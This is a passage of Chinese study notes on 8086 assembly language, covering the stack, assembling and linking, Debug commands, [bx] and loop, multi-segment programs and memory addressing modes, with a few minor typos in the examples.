title="栈"></a>栈</h2><p>特殊的存储空间，后进先出</p><p>基本操作：入栈（push），出栈（pop）</p><p>push ax（ax的数据入栈）</p><p>pop ax（栈的数据入ax）</p><h5 id="机制"><a href="#机制" class="headerlink" title="机制"></a>机制</h5><p>对8086cpu</p><p>段寄存器SS    寄存器SP</p><p>SS：段顶地址    SP：偏移地址</p><p>SS:SP永远指向栈顶地址</p><h5 id="栈顶超界"><a href="#栈顶超界" class="headerlink" title="栈顶超界"></a>栈顶超界</h5><p>在栈顶超出空间后，执行push会使得超出部分被覆盖</p><h5 id="栈段"><a href="#栈段" class="headerlink" title="栈段"></a>栈段</h5><p>在一个段内，可以将空间当作栈用，以栈的形式访问，这个空间就是栈段。</p><h1 id="4-第一个程序"><a href="#4-第一个程序" class="headerlink" title="4.第一个程序"></a>4.第一个程序</h1><h2 id="源程序写出到执行"><a href="#源程序写出到执行" class="headerlink" title="源程序写出到执行"></a>源程序写出到执行</h2><p>1.编写源程序    产生文本文件</p><p>2.先编译产生目标文件，在进行连接，生成可执行文件（程序+描述信息）</p><p>3.执行程序</p><p>操作系统依照描述信息，加载机器码与数据</p><p>初始化（例如CS:IP）后执行</p><h2 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h2><p>汇编语言源程序包含</p><p>1.汇编指令（有对应的机器码，可以被cpu执行）</p><p>2.伪指令（没有对应的机器码，无法被cpu执行）</p><h4 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h4><p>由编译器执行</p><p>1.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">XXX segment<span class="hljs-regexp">//</span>开始<br><span class="hljs-regexp">//</span>定义一个段，XXX为段名<br>XXX ends<span class="hljs-regexp">//</span>结束<br></code></pre></td></tr></table></figure><p>2.</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">end<span class="hljs-comment">//汇编程序的结束标志</span><br></code></pre></td></tr></table></figure><p>2.</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span>//假设，假设某一寄存器与程序中的一个段关联，通过<span class="hljs-meta">assume</span>说明<br><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:codesg//将寄存器<span class="hljs-built_in">cs</span>与段codesg关联<br></code></pre></td></tr></table></figure><h4 id="程序结构"><a href="#程序结构" class="headerlink" title="程序结构"></a>程序结构</h4><p>由段组成</p><h4 id="程序返回"><a href="#程序返回" class="headerlink" title="程序返回"></a>程序返回</h4><p>对于一个程序p2，必须有一个运行中的p1，将p2加载入内存，使p2获得cpu的控制权，p2才正常运行；</p><p>p2运行中p1停止，在p2运行结束，cpu控制权返回p1，p1继续运行</p><h5 id="如何返回："><a href="#如何返回：" class="headerlink" title="如何返回："></a>如何返回：</h5><p>由cpu执行</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00H</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21H</span><br></code></pre></td></tr></table></figure><h2 id="编译连接"><a href="#编译连接" class="headerlink" title="编译连接"></a>编译连接</h2><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>在将源程序文件编译后，会得到一个 .obj 为后缀的目标文件 .obj</p><p>（列表文件 .lst ，交叉引用文件 .crf ）：编译器为目标文件过程中的中间结果，可忽略</p><h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><p>运行连接器，设定目标文件路径+文件，设定可执行文件路劲+文件，输入要连接的库文件，生成可执行文件（.exe）</p><p>库文件：包含了一些可以调用的子程序</p><p>映像文件：中间结果，忽略</p><h4 id="简化的编译以及连接"><a href="#简化的编译以及连接" class="headerlink" title="简化的编译以及连接"></a>简化的编译以及连接</h4><p>编译和连接中的中间文件都可以忽略</p><h5 id="编译-1"><a href="#编译-1" class="headerlink" title="编译"></a>编译</h5><p>在编译器后加上源文件路径+文件，加上分号</p><p>编译器会在当前路径生成目标文件，忽略中间文件的生成</p><h5 id="连接-1"><a href="#连接-1" class="headerlink" title="连接"></a>连接</h5><p>在连接器后加上目标文件的路径+文件名，加上分号</p><p>连接器会在当前路径生成可执行文件，忽略中间文件</p><h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><h4 id="装载进入内存"><a href="#装载进入内存" class="headerlink" title="装载进入内存"></a>装载进入内存</h4><p>在DOC中，command将可执行文件加载进内存</p><p>command设置cpu的CS:IP指向程序的第一条指令</p><p>运行结束后，会返回command，command继续运行</p><h4 id="执行过程的跟踪"><a href="#执行过程的跟踪" class="headerlink" title="执行过程的跟踪"></a>执行过程的跟踪</h4><p>Debug将程序加载入内存，同时Debug依旧保持对cpu的控制</p><p>r命令查看各个寄存器的设置情况</p><p>u命令可以查看载入的指令</p><p>t命令单步执行每一条指令</p><p>（执行int 21后     结束程序）int 21要使用p命令</p><p>在返回Debug，使用Q命令退出</p><h5 id="加载过程"><a href="#加载过程" class="headerlink" title="加载过程"></a>加载过程</h5><p>在DOC中，</p><p>找一个起始地址为    SA:0    且足够的内存空间，前256字节为PSP数据区（DOS通过它与程序通信），从SA+10H:0开始装入程序；</p><p>将该内存区的段地址装入ds（DS=SA），设定CS:IP</p><h1 id="5-BX-和loop"><a href="#5-BX-和loop" class="headerlink" title="5.[BX]和loop"></a>5.[BX]和loop</h1><h2 id="bx-与内存单元"><a href="#bx-与内存单元" class="headerlink" title="[bx]与内存单元"></a>[bx]与内存单元</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>描述一个内存单元：内存单元地址+长度（类型）</p><p>对于</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,[<span class="hljs-built_in">bx</span>]<br></code></pre></td></tr></table></figure><p>将一个内存单元的内容送入ax</p><p>[0]表示偏移地址为0，段地址在ds中</p><p>[bx]表示一个内存单元，偏移地址在bx中，段地址在ds中（偏移地址EA=(bx)    段地址SA=(ds)）</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> [<span class="hljs-built_in">bx</span>],<span class="hljs-built_in">ax</span><br></code></pre></td></tr></table></figure><p>将ax中的数据送入SA:EA</p><h4 id="idata"><a href="#idata" class="headerlink" title="idata"></a>idata</h4><p>表示常量</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,[idata]代表<span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,[<span class="hljs-number">1</span>]<span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,[<span class="hljs-number">2</span>]等<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,idata代表<span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">2</span>等<br></code></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title="()"></a>()</h3><p>1.寄存器名    2.段寄存器名    3.物理地址</p><p>描述性的符号</p><p>例如</p><p>(ax)表示ax中的内容</p><p>(20000H)表示内存20000H单元的内容</p><p>对于    ((ds)*16+(bx))</p><p>(ds)为段地址，(bx)为偏移地址的内存单元的内容</p><h4 id="段前缀"><a href="#段前缀" class="headerlink" title="段前缀"></a>段前缀</h4><p>显式指明内存单元的段地址的，为段前缀</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">ds</span>:[<span class="hljs-built_in">bx</span>]//<span class="hljs-built_in">ds</span>为段地址<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">cs</span>:[<span class="hljs-built_in">bx</span>]//<span class="hljs-built_in">cs</span>为段地址<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-number">0</span>]//<span class="hljs-built_in">ss</span>为段地址<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span> <span class="hljs-built_in">es</span>:[<span class="hljs-number">0</span>]//<span class="hljs-built_in">es</span>为段地址<br></code></pre></td></tr></table></figure><h3 id="inc"><a href="#inc" class="headerlink" title="inc"></a>inc</h3><p>例如</p><p>inc bx</p><p>bx中的内容加上1</p><h2 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h2><h3 id="执行-1"><a href="#执行-1" class="headerlink" title="执行"></a>执行</h3><p>与循环有关</p><p>执行loop：</p><p>1    (cx)=(cx)-1</p><p>2    判断cx的值，不为0执行程序，为0向下执行</p><p>使用loop执行循环功能，cx存放循环次数</p><p>例如：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br>code <span class="hljs-meta">segment</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">2</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">11</span><br><span class="hljs-symbol">s:</span><span class="hljs-keyword">add</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">loop</span> s<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br>code ends<br>end<br>将<span class="hljs-keyword">add</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">ax</span>的操作执行了<span class="hljs-number">11</span>次<br></code></pre></td></tr></table></figure><p>普遍</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,循环次数<br><span class="hljs-symbol">s:</span><br>循环的代码段<br><span class="hljs-keyword">loop</span> s<br></code></pre></td></tr></table></figure><p>loop指令的标号要在前</p><p>循环执行的代码段要在标号与loop中间</p><h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>r命令查看各个寄存器的设置情况</p><p>u命令可以查看载入的指令</p><p>t命令单步执行每一条指令</p><p>int 21要使用p命令</p><p>g命令：对    g 0012    表示从CS:IP开始执行，一直到(IP)=0012h</p><p>p命令：可以一次性执行完程序</p><h3 id="与-bx-的联合"><a href="#与-bx-的联合" class="headerlink" title="与[bx]的联合"></a>与[bx]的联合</h3><h4 id="将8位数据加到16位寄存器"><a href="#将8位数据加到16位寄存器" class="headerlink" title="将8位数据加到16位寄存器"></a>将8位数据加到16位寄存器</h4><h5 id="普通加法"><a href="#普通加法" class="headerlink" title="普通加法"></a>普通加法</h5><p>1    (dx)=(dx)+内存中的8位数据    //运算对象不匹配</p><p>2    (dl)=(dl)+内存中的8位数据    //结果可能超界</p><p>使用一个16位寄存器作为中介</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,offffh<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span>//设置<span class="hljs-built_in">ds</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-built_in">ds</span>:[x]    //<span class="hljs-built_in">ds</span>:x指向fff:x单元<br><span class="hljs-keyword">mov</span> <span class="hljs-number">ah</span>,<span class="hljs-number">0</span>//<span class="hljs-built_in">ax</span>=((<span class="hljs-built_in">ds</span>)*<span class="hljs-number">16</span>+(x))=(ffffxh)<br><span class="hljs-keyword">add</span> <span class="hljs-built_in">dx</span>,<span class="hljs-built_in">ax</span>//向<span class="hljs-built_in">dx</span>中加入ffff:x单元的数值<br></code></pre></td></tr></table></figure><h2 id="Debug与汇编编译器对指令的不同处理"><a href="#Debug与汇编编译器对指令的不同处理" class="headerlink" title="Debug与汇编编译器对指令的不同处理"></a>Debug与汇编编译器对指令的不同处理</h2><h3 id="不同"><a href="#不同" class="headerlink" title="不同"></a>不同</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,[<span class="hljs-number">0</span>]<br>在编译器中，被当作<span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0</span><br>在Debug中，被当作   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><h3 id="在编译器使用内存单元"><a href="#在编译器使用内存单元" class="headerlink" title="在编译器使用内存单元"></a>在编译器使用内存单元</h3><p>1.将偏移地址送入bx寄存器，以[bx]的形式访问内存单元</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,[<span class="hljs-built_in">bx</span>]<br></code></pre></td></tr></table></figure><p>2.在[]的前面给出段地址所在的段寄存器</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">2000h</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-built_in">ds</span>:[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><h2 id="安全的空间"><a href="#安全的空间" class="headerlink" title="安全的空间"></a>安全的空间</h2><p>随意向内存空间写入是危险的</p><p>当我们要直接向内存写入内容，要先找一段安全的内存空间</p><h1 id="6-多个段的程序"><a href="#6-多个段的程序" class="headerlink" title="6.多个段的程序"></a>6.多个段的程序</h1><h2 id="获取空间"><a href="#获取空间" class="headerlink" title="获取空间"></a>获取空间</h2><p>1    加载程序时进行分配（在源程序中说明）</p><p>2    执行过程中向系统申请</p><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>当程序入口不是我们希望执行的命令，要指明程序的入口</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br>code <span class="hljs-meta">segment</span><br><span class="hljs-built_in">dw</span> <span class="hljs-number">0123h</span>,<span class="hljs-number">0456h</span>,<span class="hljs-number">0789h</span>,<span class="hljs-number">0abch</span><br><span class="hljs-symbol">start:</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br>code ends<br>end start//end除了通知编译器程序的结束，还可以通知程序的入口，此时start所指向的指令是程序的第一条指令<br></code></pre></td></tr></table></figure><p>start指向的入口，转化为入口地址，存储在可执行文件的描述信息中</p><h3 id="安排程序框架"><a href="#安排程序框架" class="headerlink" title="安排程序框架"></a>安排程序框架</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gauss">assume cs:<span class="hljs-built_in">code</span><br><span class="hljs-built_in">code</span> segment<br>数据<br>start:<br>代码<br><span class="hljs-built_in">code</span> ends<br><span class="hljs-keyword">end</span> start<br></code></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="使用数据"><a href="#使用数据" class="headerlink" title="使用数据"></a>使用数据</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">dw</span> <span class="hljs-number">0123h</span>,<span class="hljs-number">0456h</span>,<span class="hljs-number">0789h</span>,<span class="hljs-number">0abch</span><br><span class="hljs-built_in">dw</span>（define <span class="hljs-built_in">word</span>）定义字型数据，一个数据占据的空间为一个字<br></code></pre></td></tr></table></figure><h3 id="使用栈"><a href="#使用栈" class="headerlink" title="使用栈"></a>使用栈</h3><p>利用栈，将程序定义的数据逆序存放</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:codesg<br>code <span class="hljs-meta">segment</span><br><span class="hljs-built_in">dw</span> <span class="hljs-number">0123h</span>,<span class="hljs-number">0456h</span>,<span class="hljs-number">0789h</span>,<span class="hljs-number">0abch</span>,<span class="hljs-number">0123h</span>,<span class="hljs-number">0456h</span>,<span class="hljs-number">0789h</span>,<span class="hljs-number">0abch</span><br><span class="hljs-built_in">dw</span> <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>//<span class="hljs-number">16</span>个字型数据，存放数据，当作栈使用<br><span class="hljs-symbol">start:</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">cs</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ss</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">sp</span>,<span class="hljs-number">30h</span>//设置栈顶<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">8</span><br><span class="hljs-symbol">s1:</span> <span class="hljs-keyword">push</span> <span class="hljs-built_in">cs</span>:[<span class="hljs-built_in">bx</span>]//入栈<br><span class="hljs-keyword">add</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">2</span><br><span class="hljs-keyword">loop</span> s1<br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">8</span><br><span class="hljs-symbol">s2:</span> <span class="hljs-keyword">pop</span> <span class="hljs-built_in">cs</span>:[<span class="hljs-built_in">bx</span>] //出栈<br><span class="hljs-keyword">add</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">2</span><br><span class="hljs-keyword">loop</span> s2<br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p>依次将字单元入栈，在依次出栈</p><h2 id="放入不同的段"><a href="#放入不同的段" class="headerlink" title="放入不同的段"></a>放入不同的段</h2><h3 id="定义多个段"><a href="#定义多个段" class="headerlink" title="定义多个段"></a>定义多个段</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code,<span class="hljs-built_in">ds</span>:data,<span class="hljs-built_in">ss</span>:stack<br><br>data sedment<br><span class="hljs-built_in">dw</span> <span class="hljs-number">0123h</span>,<span class="hljs-number">0456h</span>,<span class="hljs-number">0789h</span>,<span class="hljs-number">0abch</span><br>data ends<br><br>stack sedment<br><span class="hljs-built_in">dw</span> <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>stack ends<br><br>code sedment<br><span class="hljs-symbol">start:</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,stack<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ss</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">sp</span>,<span class="hljs-number">20h</span>//设置栈顶指向stack<br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,data<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span>//<span class="hljs-built_in">ds</span>指向data<br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">8</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">s1:</span> <span class="hljs-keyword">push</span> <span class="hljs-built_in">cs</span>:[<span class="hljs-built_in">bx</span>]//入栈<br><span class="hljs-keyword">add</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">2</span><br><span class="hljs-keyword">loop</span> s1<br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">8</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">s2:</span> <span class="hljs-keyword">pop</span> <span class="hljs-built_in">cs</span>:[<span class="hljs-built_in">bx</span>] //出栈<br><span class="hljs-keyword">add</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">2</span><br><span class="hljs-keyword">loop</span> s2<br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br>code ends<br><br>end start<br></code></pre></td></tr></table></figure><p>通过assume，将cs与code相连，使cs指向code（其余同）</p><h3 id="引用多个段"><a href="#引用多个段" class="headerlink" title="引用多个段"></a>引用多个段</h3><p>在程序中，段名（例如code）相当于一个标号，代表了段地址</p><p>例如</p><p>将data中的一个数据送入bx</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,data<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-built_in">ds</span>:[<span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><h1 id="7-灵活的定位内存地址法"><a href="#7-灵活的定位内存地址法" class="headerlink" title="7.灵活的定位内存地址法"></a>7.灵活的定位内存地址法</h1><h3 id="and与or"><a href="#and与or" class="headerlink" title="and与or"></a>and与or</h3><p>and ：逻辑与</p><p>or  ：逻辑或</p><h3 id="字符形式的数据"><a href="#字符形式的数据" class="headerlink" title="字符形式的数据"></a>字符形式的数据</h3><p>以     ‘……’    的形式指明是字符型</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">db</span>//define <span class="hljs-built_in">byte</span><br>//伪操作指令，定义单字节数据<br><br><span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;un&#x27;</span><br>//相当于<span class="hljs-built_in">db</span> <span class="hljs-number">75h</span>,<span class="hljs-number">6eh</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-string">&#x27;a&#x27;</span><br>//相当于<span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">61h</span><br></code></pre></td></tr></table></figure><h3 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h3><p>在二进制下，大小写的差距仅在与第六位，大写是0，小写是1</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span><span class="hljs-number">01000001</span>b<span class="hljs-number">41</span>h<br><br><span class="hljs-attribute">a</span><span class="hljs-number">01100001</span>b<span class="hljs-number">61</span>h<br></code></pre></td></tr></table></figure><p>转大写，或；转小写，与</p><h2 id="bx-idata"><a href="#bx-idata" class="headerlink" title="[bx+idata]"></a>[bx+idata]</h2><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>在一个起始地址的基础上间接定位一个内存单元</p><p>除[bx]外，[bx+idata]也可以表示一个内存单元</p><p>偏移地址伪(bx)+idata</p><p>例如（不同格式）</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,[<span class="hljs-built_in">bx</span>+<span class="hljs-number">200</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,[<span class="hljs-number">200</span>+<span class="hljs-built_in">bx</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">200</span>[<span class="hljs-built_in">bx</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,[<span class="hljs-built_in">bx</span>].<span class="hljs-number">200</span><br><br>//(<span class="hljs-built_in">ax</span>)=((<span class="hljs-built_in">ds</span>)*<span class="hljs-number">16</span>+(<span class="hljs-built_in">bx</span>)+<span class="hljs-number">200</span>)<br><br></code></pre></td></tr></table></figure><h3 id="处理数组"><a href="#处理数组" class="headerlink" title="处理数组"></a>处理数组</h3><p>例如    ：[bx+0]    与    [bx+5]</p><p>使用一次    bx    就可以使用两个数组</p><p>0    与    5    给出起始偏移地址；bx    给出从起始偏移地址开始的相对偏移地址</p><h2 id="SI与DI"><a href="#SI与DI" class="headerlink" title="SI与DI"></a>SI与DI</h2><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><p>si    与    di    是8086cpu    中与    bx    功能相近的寄存器</p><p>但是无法分成两个8位寄存器</p><h3 id="bx-si-与-bx-di"><a href="#bx-si-与-bx-di" class="headerlink" title="[bx+si]与[bx+di]"></a>[bx+si]与[bx+di]</h3><p>使用两个变量表示地址</p><p>例如    